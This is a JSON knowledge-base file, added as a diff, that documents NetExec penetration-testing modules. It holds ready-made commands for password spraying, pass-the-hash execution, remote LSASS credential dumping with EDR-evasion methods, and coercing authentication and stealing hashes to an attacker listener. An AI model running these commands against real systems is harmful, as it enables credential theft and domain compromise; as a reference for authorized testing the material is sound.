@@ -1,0 +1,290 @@
+{
+  "knowledge_base_part": 3,
+  "categories": [
+    {
+      "id": "other_protocols",
+      "name": "LDAP, WinRM, RDP, MSSQL, SSH, FTP Protocols",
+      "topics": [
+        {
+          "title": "LDAP Module",
+          "keywords": ["ldap", "LDAP", "port 389", "port 636", "ldaps", "active directory", "domain enumeration", "--users", "--groups", "--computers", "--trusted-for-delegation", "--admin-count", "--password-not-required", "--password-policy", "ldap-checker", "LDAP signing"],
+          "difficulty": "intermediate",
+          "content": "The LDAP module connects to Active Directory via LDAP (port 389) or LDAPS (port 636) for comprehensive domain enumeration. LDAP is the most thorough protocol for Active Directory queries. Key capabilities: user enumeration (--users) with descriptions, group enumeration (--groups) with member counts, computer enumeration (--computers) listing all domain-joined machines, trust enumeration (--trusted-for-delegation) finding unconstrained delegation accounts, admin count (--admin-count) identifying accounts with adminCount=1 (protected accounts), password policy (--password-policy), and password-not-required finding accounts that don't require passwords. LDAP is also the protocol used for Kerberoasting (--kerberoasting) and AS-REP roasting (--asreproast). The ldap-checker module checks if LDAP signing is required, which affects relay attacks targeting LDAP. LDAP supports both NTLM and Kerberos authentication. Use -d to specify the domain explicitly. LDAP queries are generally less noisy than SMB enumeration and provide more structured data. For Kerberos auth: 'nxc ldap dc01.corp.local -k --use-kcache --users'.",
+          "examples": [
+            {
+              "command": "nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --users --groups",
+              "explanation": "Enumerate all domain users and groups via LDAP, providing comprehensive AD information",
+              "use_case": "Thorough Active Directory enumeration during the information gathering phase"
+            },
+            {
+              "command": "nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --trusted-for-delegation",
+              "explanation": "Find all accounts with unconstrained delegation — high-value targets for privilege escalation",
+              "use_case": "Identifying delegation abuse opportunities for domain compromise"
+            },
+            {
+              "command": "nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --admin-count",
+              "explanation": "Find accounts with adminCount=1, indicating they are or were members of privileged groups",
+              "use_case": "Identifying high-privilege accounts for targeted attacks"
+            },
+            {
+              "command": "nxc ldap 192.168.1.10 -u jsmith -p 'Password123' -M ldap-checker",
+              "explanation": "Check if LDAP signing is required on the domain controller",
+              "use_case": "Determining if LDAP relay attacks are possible"
+            }
+          ],
+          "warnings": ["LDAP queries may be logged by DC auditing policies", "LDAPS (636) provides encryption but LDAP (389) is cleartext"],
+          "best_practices": ["Use LDAP for comprehensive AD enumeration", "Always check --trusted-for-delegation for escalation paths", "Use --admin-count to find privileged accounts quickly"],
+          "related_cves": [],
+          "related_topics": ["Kerberoasting", "AS-REP Roasting", "Delegation Abuse", "User Enumeration"]
+        },
+        {
+          "title": "WinRM Module",
+          "keywords": ["winrm", "WinRM", "port 5985", "port 5986", "PowerShell Remoting", "PSRemoting", "Remote Management Users", "WSMan", "Windows Remote Management"],
+          "difficulty": "intermediate",
+          "content": "WinRM (Windows Remote Management) enables PowerShell Remoting on port 5985 (HTTP) or 5986 (HTTPS). NXC's WinRM module checks authentication and supports command execution. The (Pwn3d!) flag for WinRM means the user can execute commands via PowerShell Remoting. WinRM access requires the user to be a local administrator OR a member of the 'Remote Management Users' local group. WinRM is commonly enabled on servers but may be disabled on workstations. Output format: WINRM IP 5985 HOSTNAME [+] DOMAIN\\user:password (Pwn3d!). WinRM supports both -x (cmd.exe) and -X (PowerShell) execution, as well as PTH (-H hash). WinRM is a good alternative execution path when SMB command execution is blocked or monitored. WinRM generates Event ID 4624 Type 3 and WSMan operational events (Event ID 91). For OPSEC, WinRM is moderate — it generates PowerShell and WinRM-specific logs but doesn't create services like smbexec. WinRM supports Kerberos auth (-k) for stealthier operations.",
+          "examples": [
+            {
+              "command": "nxc winrm 192.168.1.0/24 -u administrator -p 'Password123'",
+              "explanation": "Check WinRM access across the subnet — Pwn3d! means PowerShell Remoting is available",
+              "use_case": "Finding hosts where WinRM can be used for command execution"
+            },
+            {
+              "command": "nxc winrm 192.168.1.20 -u administrator -p 'Password123' -X 'Get-Process | Select Name,Id'",
+              "explanation": "Execute a PowerShell command via WinRM to list running processes",
+              "use_case": "Remote PowerShell execution for enumeration or exploitation"
+            },
+            {
+              "command": "nxc winrm 192.168.1.20 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99' -x 'whoami'",
+              "explanation": "Execute commands via WinRM using pass-the-hash authentication",
+              "use_case": "Alternative command execution path when SMB is blocked"
+            }
+          ],
+          "warnings": ["WinRM generates PowerShell logging events", "WinRM may be disabled on workstations by default", "Port 5985 (HTTP) is cleartext — 5986 (HTTPS) is preferred"],
+          "best_practices": ["Use WinRM as an alternative when SMB execution is blocked", "Check port 5986 for HTTPS WinRM as well", "WinRM with Kerberos (-k) avoids NTLM events"],
+          "related_cves": [],
+          "related_topics": ["Command Execution Methods", "PowerShell Remoting", "OPSEC"]
+        },
+        {
+          "title": "RDP Module",
+          "keywords": ["rdp", "RDP", "port 3389", "Remote Desktop", "NLA", "Network Level Authentication", "--screenshot", "RDP access", "remote desktop protocol", "RDP brute"],
+          "difficulty": "beginner",
+          "content": "The RDP module checks Remote Desktop Protocol authentication on port 3389. The (Pwn3d!) flag means the user can successfully authenticate via RDP. NXC checks whether Network Level Authentication (NLA) is required — NLA mandates valid credentials before the full RDP connection is established. RDP can be used for password spraying against RDP services: 'nxc rdp 192.168.1.0/24 -u users.txt -p pass --continue-on-success'. The --screenshot flag captures a screenshot of the RDP session. If you have admin access via SMB but RDP is disabled, you can enable it remotely via registry modification: 'nxc smb target -u admin -p pass -x reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\\ Server /v fDenyTSConnections /t REG_DWORD /d 0 /f' and then open the firewall rule. RDP authentication generates Event ID 4624 Type 10 (RemoteInteractive) and Event ID 1149 in the TerminalServices-RemoteConnectionManager log. RDP is noisier than SMB/WinRM because it creates a full interactive session visible in task manager and user sessions.",
+          "examples": [
+            {
+              "command": "nxc rdp 192.168.1.0/24 -u administrator -p 'Password123'",
+              "explanation": "Check RDP access across the subnet — Pwn3d! means successful RDP authentication",
+              "use_case": "Finding hosts where RDP access is available"
+            },
+            {
+              "command": "nxc rdp 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success",
+              "explanation": "Password spray against RDP services across the subnet",
+              "use_case": "Credential spraying when SMB spraying is being detected"
+            },
+            {
+              "command": "nxc rdp 192.168.1.20 -u administrator -p 'Password123' --screenshot",
+              "explanation": "Authenticate via RDP and capture a screenshot of the session",
+              "use_case": "Visual evidence gathering for the penetration test report"
+            }
+          ],
+          "warnings": ["RDP creates a visible interactive session", "RDP spraying generates Type 10 logon events", "Excessive RDP failures may trigger account lockout"],
+          "best_practices": ["Check RDP access as an alternative to SMB/WinRM", "Use --screenshot for evidence gathering", "Consider enabling RDP via SMB if needed and authorized"],
+          "related_cves": [],
+          "related_topics": ["Password Spraying", "Authentication", "Enabling RDP Remotely"]
+        },
+        {
+          "title": "MSSQL Module",
+          "keywords": ["mssql", "MSSQL", "SQL Server", "port 1433", "sa", "xp_cmdshell", "linked servers", "sysadmin", "SQL authentication", "Windows authentication", "SQL injection", "database"],
+          "difficulty": "intermediate",
+          "content": "The MSSQL module targets Microsoft SQL Server on port 1433. It supports both SQL authentication (local SQL accounts like sa) and Windows/domain authentication. The (Pwn3d!) flag indicates sysadmin privileges on the SQL instance. Key capabilities: SQL query execution (-q 'SELECT ...'), OS command execution via xp_cmdshell (-x 'command'), linked server enumeration and exploitation, and hash stealing via UNC path (xp_dirtree). xp_cmdshell is the most valuable feature — if you have sysadmin access, you can execute operating system commands through SQL Server. If xp_cmdshell is disabled, NXC will attempt to enable it. Common attack paths: default sa password (sa:sa or sa:<empty>), Windows auth with domain credentials that have sysadmin on the SQL instance, SQL injection escalation to xp_cmdshell. Hash stealing forces the SQL Server's service account to authenticate to your listener: 'nxc mssql target -u sa -p pass -x \"EXEC xp_dirtree \\\\\\\\attacker\\\\share\"'. Linked servers allow pivoting to other SQL instances: 'EXEC (''whoami'') AT [LINKED_SERVER]'. The mssql_priv module checks for impersonation opportunities to escalate from a low-privilege SQL login to sysadmin.",
+          "examples": [
+            {
+              "command": "nxc mssql 192.168.1.0/24 -u sa -p 'sa'",
+              "explanation": "Check for SQL Server instances with default sa:sa credentials across the subnet",
+              "use_case": "Finding SQL servers with default credentials — a critical finding"
+            },
+            {
+              "command": "nxc mssql 192.168.1.25 -u sa -p 'SQLPassword123!' -x 'whoami'",
+              "explanation": "Execute an OS command via xp_cmdshell on the SQL Server",
+              "use_case": "Gaining OS-level command execution through SQL Server sysadmin access"
+            },
+            {
+              "command": "nxc mssql 192.168.1.25 -u sa -p 'SQLPassword123!' -q 'SELECT name FROM sys.databases'",
+              "explanation": "List all databases on the SQL Server instance",
+              "use_case": "Enumerating databases for sensitive data discovery"
+            },
+            {
+              "command": "nxc mssql 192.168.1.25 -u jsmith -p 'Password123' -d CORP.LOCAL -M mssql_priv",
+              "explanation": "Check for SQL privilege escalation opportunities via impersonation",
+              "use_case": "Escalating from low-privilege SQL login to sysadmin"
+            }
+          ],
+          "warnings": ["xp_cmdshell execution is highly detectable", "Default sa credentials are a critical finding", "Hash stealing generates authentication traffic to your attacker IP"],
+          "best_practices": ["Always check for default sa credentials", "Use linked servers for pivoting to other SQL instances", "Capture the SQL service account hash via xp_dirtree for cracking or relay"],
+          "related_cves": [],
+          "related_topics": ["xp_cmdshell", "Linked Servers", "Hash Stealing", "Privilege Escalation"]
+        },
+        {
+          "title": "SSH and FTP Modules",
+          "keywords": ["ssh", "SSH", "port 22", "ftp", "FTP", "port 21", "anonymous FTP", "SSH key", "--key-file", "Linux", "network devices"],
+          "difficulty": "beginner",
+          "content": "The SSH module tests credentials against SSH services on port 22, targeting Linux/Unix systems, network devices, and appliances. SSH supports password authentication (-u user -p pass), key authentication (-u user --key-file /path/to/id_rsa), and command execution (-x 'command'). A successful SSH login does not show (Pwn3d!) — SSH access inherently provides command execution capability at the authenticated user's privilege level. SSH password spraying works the same as SMB: 'nxc ssh 192.168.1.0/24 -u users.txt -p pass --continue-on-success'. The FTP module tests FTP authentication on port 21. The most important check is anonymous access: 'nxc ftp target -u anonymous -p empty'. Anonymous FTP access may reveal sensitive files, backup archives, or deployment packages. FTP supports file listing (--ls) and password spraying. Both modules are simpler than SMB/LDAP but valuable for covering non-Windows targets in mixed environments. Network devices (routers, switches, firewalls) often expose SSH with default or weak credentials.",
+          "examples": [
+            {
+              "command": "nxc ssh 192.168.1.100 -u root -p 'toor' -x 'id'",
+              "explanation": "Authenticate to SSH and execute the 'id' command to check the user's privileges",
+              "use_case": "Gaining command execution on Linux targets"
+            },
+            {
+              "command": "nxc ssh 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success",
+              "explanation": "Password spray against SSH across the subnet",
+              "use_case": "Finding valid SSH credentials in mixed Windows/Linux environments"
+            },
+            {
+              "command": "nxc ftp 192.168.1.0/24 -u anonymous -p ''",
+              "explanation": "Check for anonymous FTP access across the subnet",
+              "use_case": "Finding FTP servers that allow unauthenticated access"
+            },
+            {
+              "command": "nxc ssh 192.168.1.100 -u admin --key-file /tmp/id_rsa",
+              "explanation": "Authenticate to SSH using a private key file",
+              "use_case": "Using a found or stolen SSH private key for authentication"
+            }
+          ],
+          "warnings": ["SSH brute force may trigger fail2ban or similar protections", "Anonymous FTP access is a significant finding — report it", "SSH keys should be checked for passphrase protection"],
+          "best_practices": ["Always check for anonymous FTP access", "Test default credentials on network devices via SSH", "Use --key-file for key-based authentication"],
+          "related_cves": [],
+          "related_topics": ["Password Spraying", "Linux Targets", "Network Devices"]
+        }
+      ]
+    },
+    {
+      "id": "modules_system",
+      "name": "NXC Modules System and Database",
+      "topics": [
+        {
+          "title": "NXC Module System",
+          "keywords": ["-M", "-L", "-o", "module", "modules", "module options", "--options", "nxc modules", "plugin", "list modules"],
+          "difficulty": "intermediate",
+          "content": "NXC's module system extends its capabilities through plugins that perform specific post-exploitation tasks. Modules are invoked with -M MODULE_NAME and configured with -o OPTION=value. The -L flag lists all available modules for a protocol: 'nxc smb -L'. Each module has its own options viewable with 'nxc smb target -M module_name --options'. Modules operate within the context of the authenticated session — they require the same authentication as regular NXC commands. Key module categories: credential dumping (lsassy, mimikatz, procdump, nanodump, handlekatz), vulnerability checking (zerologon, nopac, petitpotam), enumeration (spider_plus, get_netconnections, enum_av, bloodhound), credential discovery (gpp_password, gpp_autologin, wifi, dpapi_creds, keepass_trigger), persistence and execution (empire_exec, met_inject, slinky), and system configuration (rdp, webdav, runasppl). Modules are protocol-specific — SMB modules won't work with LDAP and vice versa. The module ecosystem is community-driven with new modules added regularly. After updating NXC (pipx upgrade netexec), new modules become available.",
+          "examples": [
+            {
+              "command": "nxc smb -L",
+              "explanation": "List all available modules for the SMB protocol",
+              "use_case": "Discovering available post-exploitation modules"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u admin -p 'Password123' -M lsassy",
+              "explanation": "Run the lsassy module to dump LSASS credentials remotely",
+              "use_case": "Stealthy credential extraction from LSASS memory"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -M lsassy --options",
+              "explanation": "Show available options for the lsassy module",
+              "use_case": "Checking module configuration options before execution"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u admin -p 'Password123' -M lsassy -o METHOD=nanodump",
+              "explanation": "Run lsassy with the nanodump method for stealthier LSASS dumping",
+              "use_case": "Choosing a specific dump method to evade EDR detection"
+            }
+          ],
+          "warnings": ["Some modules may trigger AV/EDR alerts", "Module behavior may vary across Windows versions", "Not all modules are available for all protocols"],
+          "best_practices": ["Check module options with --options before running", "Use lsassy instead of mimikatz for better OPSEC", "Keep NXC updated for latest modules"],
+          "related_cves": [],
+          "related_topics": ["lsassy Module", "Credential Dumping", "Vulnerability Checking"]
+        },
+        {
+          "title": "Key Credential Dumping Modules",
+          "keywords": ["lsassy", "mimikatz", "procdump", "nanodump", "handlekatz", "LSASS", "credential dump", "memory dump", "comsvcs", "METHOD", "dpapi_creds", "wifi"],
+          "difficulty": "advanced",
+          "content": "NXC provides multiple modules for extracting credentials from LSASS process memory, each with different OPSEC profiles. lsassy is the recommended module — it dumps LSASS remotely using configurable methods without dropping Mimikatz to disk. Available lsassy methods include comsvcs (uses built-in comsvcs.dll MiniDump), procdump (Microsoft's signed ProcDump utility), nanodump (stealthier using direct syscalls), dumpert (uses direct syscalls), handlekatz (handles-based approach), rdrleakdiag (abuses rdrleakdiag.exe), and wer (abuses Windows Error Reporting). The mimikatz module executes Mimikatz remotely — extremely powerful but highly detectable as the binary is signatured by every AV/EDR. procdump uses Microsoft's legitimate ProcDump tool which is signed by Microsoft (less suspicious binary but LSASS access still detected). nanodump is designed for evasion using direct syscalls to avoid API hooking, can produce obfuscated dumps, and is the best option when EDR is active. handlekatz uses handle duplication for stealthier access. Additional credential modules: dpapi_creds extracts DPAPI-protected credentials, wifi extracts saved WiFi passwords, keepass_trigger exploits KeePass trigger mechanism for credential extraction. All credential dumping modules require local admin (Pwn3d!) and generate Sysmon Event ID 10 (process access to lsass.exe).",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' -M lsassy",
+              "explanation": "Dump LSASS credentials using lsassy with the default method — outputs domain\\user and NTLM hashes for logged-on users",
+              "use_case": "Primary credential dumping technique for post-exploitation"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' -M lsassy -o METHOD=nanodump",
+              "explanation": "Use nanodump method for stealthier LSASS dumping with direct syscalls to evade EDR API hooks",
+              "use_case": "Credential dumping in environments with active EDR"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' -M lsassy -o METHOD=comsvcs",
+              "explanation": "Use comsvcs.dll MiniDump — built-in Windows DLL, no external tool needed",
+              "use_case": "Credential dumping using living-off-the-land approach"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' -M wifi",
+              "explanation": "Extract saved WiFi passwords from the target host",
+              "use_case": "Finding WiFi credentials for physical proximity attacks"
+            }
+          ],
+          "warnings": ["All LSASS dumping generates Sysmon Event 10", "mimikatz binary is detected by all modern AV/EDR", "RunAsPPL (Protected Process Light) blocks most dump methods", "Credential Guard prevents hash storage in LSASS on modern Windows"],
+          "best_practices": ["Use lsassy with METHOD=nanodump for best OPSEC", "Avoid mimikatz module — use lsassy instead", "Try multiple methods if one fails: comsvcs → nanodump → procdump", "Check for RunAsPPL before attempting LSASS dump"],
+          "related_cves": [],
+          "related_topics": ["LSASS Protection", "RunAsPPL", "Credential Guard", "EDR Evasion"]
+        },
+        {
+          "title": "Vulnerability Checking Modules",
+          "keywords": ["zerologon", "CVE-2020-1472", "petitpotam", "CVE-2021-36942", "nopac", "CVE-2021-42278", "CVE-2021-42287", "sAMAccountName", "MS-EFSRPC", "vulnerability check", "exploit module"],
+          "difficulty": "advanced",
+          "content": "NXC includes modules for checking and exploiting critical Active Directory vulnerabilities. Zerologon (CVE-2020-1472, CVSS 10.0) allows unauthenticated domain controller compromise by exploiting a flaw in the Netlogon Remote Protocol (MS-NRPC). The zerologon module checks if a DC is vulnerable: 'nxc smb dc -u '' -p '' -M zerologon'. WARNING: The exploit changes the DC machine account password to empty, which can break domain operations — use check-only mode. PetitPotam (CVE-2021-36942) coerces authentication via the MS-EFSRPC (Encrypting File System Remote Protocol). It forces the target to authenticate to an attacker-controlled server, enabling NTLM relay attacks. Usage: 'nxc smb dc -u user -p pass -M petitpotam -o LISTENER=attacker_ip'. Combined with ntlmrelayx targeting AD CS, this achieves domain compromise. NoPac (CVE-2021-42278 + CVE-2021-42287) exploits sAMAccountName spoofing to allow any domain user to impersonate the domain controller machine account, achieving full domain compromise. The nopac module checks vulnerability: 'nxc smb dc -u user -p pass -M nopac'. These vulnerabilities are patched but commonly found in environments with poor patch management. Always check for these during internal assessments.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u '' -p '' -M zerologon",
+              "explanation": "Check if the domain controller is vulnerable to Zerologon (CVE-2020-1472) — no credentials needed",
+              "use_case": "Critical vulnerability check during initial assessment"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M petitpotam -o LISTENER=10.10.10.5",
+              "explanation": "Coerce the DC to authenticate to your listener via PetitPotam for NTLM relay",
+              "use_case": "Triggering authentication coercion for relay attacks against AD CS"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M nopac",
+              "explanation": "Check if the DC is vulnerable to the sAMAccountName spoofing attack (NoPac)",
+              "use_case": "Checking for CVE-2021-42278/42287 privilege escalation vulnerability"
+            }
+          ],
+          "warnings": ["NEVER exploit Zerologon in production — it breaks the domain", "PetitPotam requires a relay listener to be useful", "These vulnerabilities should be patched — always report if found"],
+          "best_practices": ["Always check for Zerologon, PetitPotam, and NoPac during assessments", "Use check-only mode for Zerologon — never exploit in production", "Report any unpatched critical vulnerabilities immediately"],
+          "related_cves": ["CVE-2020-1472", "CVE-2021-36942", "CVE-2021-42278", "CVE-2021-42287"],
+          "related_topics": ["NTLM Relay", "Domain Compromise", "Patch Management"]
+        },
+        {
+          "title": "NXC Database (nxcdb)",
+          "keywords": ["nxcdb", "database", "workspace", "creds", "hosts", "shares", "export", "query results", "engagement tracking", "SQLite", "proto"],
+          "difficulty": "intermediate",
+          "content": "NXC maintains a local SQLite database that automatically stores discovered hosts, credentials, and shares as you run commands. The database is accessed via the 'nxcdb' command which provides an interactive console. Key features: workspace management for separating engagements ('workspace create pentest_corp', 'workspace pentest_corp'), protocol switching ('proto smb', 'proto ldap', 'proto winrm'), querying hosts ('hosts' command shows all discovered hosts with IP, port, hostname, domain, OS, signing status), querying credentials ('creds' shows all discovered usernames, passwords, and hashes), querying shares ('shares' shows all enumerated shares), and data export ('export creds csv /tmp/creds.csv', 'export hosts csv /tmp/hosts.csv'). Each protocol has its own database file stored at ~/.nxc/workspaces/<workspace_name>/<protocol>.db. The database automatically tracks: every successful authentication (username, password/hash, target, admin access), every host discovered (IP, hostname, domain, OS, signing), every share enumerated (name, permissions), and every credential dumped. This makes nxcdb invaluable for large engagements where you need to track hundreds of credentials and hosts. You can query specific data: 'creds --domain CORP.LOCAL' or 'hosts --user administrator'.",
+          "examples": [
+            {
+              "command": "nxcdb",
+              "explanation": "Launch the NXC database interactive console for querying stored results",
+              "use_case": "Reviewing and querying all findings from the current engagement"
+            },
+            {
+              "command": "workspace create internal_pentest_2024",
+              "explanation": "Create a new workspace to separate findings from different engagements (run inside nxcdb)",
+              "use_case": "Organizing findings when working on multiple engagements"
+            },
+            {
+              "command": "creds",
+              "explanation": "List all discovered credentials (passwords and hashes) stored in the database (run inside nxcdb)",
+              "use_case": "Reviewing all credentials found during the engagement"
+            },
+            {
+              "command": "export creds csv /tmp/engagement_creds.csv",
+              "explanation": "Export all stored credentials to a CSV file for reporting (run inside nxcdb)",
+              "use_case": "Generating credential reports for the engagement deliverable"
+            }
+          ],
+          "warnings": ["Database files contain sensitive credentials — protect them", "Each workspace has separate databases — ensure you're in the right workspace", "The database is SQLite — can be queried directly if needed"],
+          "best_practices": ["Create a workspace per engagement for clean separation", "Query the database regularly to track progress", "Export data for reporting at the end of the engagement", "Securely delete the database after engagement completion"],
+          "related_cves": [],
+          "related_topics": ["Credential Management", "Engagement Tracking", "Reporting"]
+        }
+      ]
+    }
+  ]
+}
